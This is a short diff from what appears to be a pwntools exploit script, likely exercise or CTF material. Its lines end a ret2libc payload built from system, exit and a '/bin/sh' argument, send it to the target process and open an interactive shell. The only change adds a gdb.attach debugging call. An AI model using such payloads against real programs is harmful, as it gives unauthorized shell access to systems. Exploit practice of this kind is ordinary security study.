@@ -17,7 +17,7 @@ buff += p32(system)
 buff += p32(exit)
 #Argument for system()
 buff += p32(binsh)
-
+gdb.attach(p)
 p.sendline(buff)
 p.interactive()
 
